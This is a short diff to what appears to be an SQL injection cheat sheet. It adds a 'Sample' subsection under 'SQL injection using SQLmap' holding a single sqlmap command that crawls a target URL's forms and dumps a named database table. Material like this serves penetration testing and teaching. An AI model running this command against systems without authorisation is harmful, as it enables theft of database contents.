@@ -125,6 +125,12 @@ transformed into U+0027 APOSTROPHE (')
 
 ## SQL injection using SQLmap
 
+### Sample
+
+```powershell
+sqlmap -u "<url>" -D <database> -T <Table> --dump --forms --crawl=2 --level 5
+```
+
 ### Basic arguments for SQLmap
 
 ```powershell
